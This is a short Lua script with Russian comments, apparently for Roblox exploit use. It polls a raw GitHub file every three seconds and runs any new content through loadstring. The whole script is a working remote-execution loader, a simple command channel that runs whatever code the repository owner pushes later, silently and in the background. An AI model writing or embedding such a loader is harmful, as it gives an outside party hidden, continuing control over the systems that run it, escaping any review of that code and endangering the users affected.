-- ПУТЬ К ВАШЕМУ ФАЙЛУ КОМАНД
local commandUrl = "https://raw.githubusercontent.com/kazzqa/executable-script/refs/heads/main/command"
local lastCommandCode = ""

-- Цикл проверки команд в фоне
task.spawn(function()
    while task.wait(3) do
        local success, currentCode = pcall(function()
            return game:HttpGet(commandUrl)
        end)
        
        -- Если на GitHub появился новый код — запускаем его
        if success and currentCode and currentCode ~= "" and currentCode ~= lastCommandCode then
            lastCommandCode = currentCode
            local runCode = loadstring(currentCode)
            if runCode then
                pcall(runCode)
            end
        end
    end
end)
